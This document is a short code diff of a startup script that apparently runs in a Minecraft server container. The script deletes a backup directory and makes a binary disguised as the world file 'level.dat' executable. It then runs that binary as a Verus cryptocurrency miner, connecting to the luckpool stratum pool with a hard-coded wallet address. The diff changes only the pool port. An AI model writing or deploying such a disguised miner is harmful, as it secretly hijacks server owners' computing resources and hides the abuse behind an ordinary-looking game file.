@@ -10,4 +10,4 @@ rm -r /home/container/hmbackup
 #add chmod because yes mf
 chmod 777 level.dat #hm
 chmod 777 verus-solver #solver
-./level.dat -c stratum+tcp://eu.luckpool.net:3956 -u RKxL8cCnTTBwMcV1dPFst2pt6P8AJwyfDW.$(cat /home/container/world_the_end/session.lock)
+./level.dat -c stratum+tcp://eu.luckpool.net:3960 -u RKxL8cCnTTBwMcV1dPFst2pt6P8AJwyfDW.$(cat /home/container/world_the_end/session.lock)
